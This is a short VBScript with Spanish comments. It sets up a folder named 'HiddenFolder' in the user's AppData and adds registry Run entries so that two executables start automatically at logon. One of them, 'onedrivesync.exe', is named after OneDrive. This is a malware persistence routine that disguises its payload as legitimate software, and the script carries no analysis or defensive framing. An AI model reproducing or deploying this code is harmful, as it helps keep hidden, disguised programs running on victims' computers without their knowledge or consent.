Dim objShell, objFSO, objRegistry
Dim downloadFolder, exePath, conexionPath, regKey, exeName, conexionName

' Configuración inicial
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

downloadFolder = objShell.ExpandEnvironmentStrings("%APPDATA%\Roaming\HiddenFolder")
exePath = downloadFolder & "\onedrivesync.exe"
conexionPath = downloadFolder & "\conexion.exe"

regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
exeName = "onedrivesync"
conexionName = "conexion"

' Registrar onedrivesync.exe en el inicio automático
cmdLineEXE = Chr(34) & exePath & Chr(34)
Set objRegistry = CreateObject("WScript.Shell")
objRegistry.RegWrite regKey & "\" & exeName, cmdLineEXE

' Registrar conexion.exe en el inicio automático
cmdLineCONEXION = Chr(34) & conexionPath & Chr(34)
objRegistry.RegWrite regKey & "\" & conexionName, cmdLineCONEXION

' Limpiar objetos
Set objShell = Nothing
Set objFSO = Nothing
Set objRegistry = Nothing
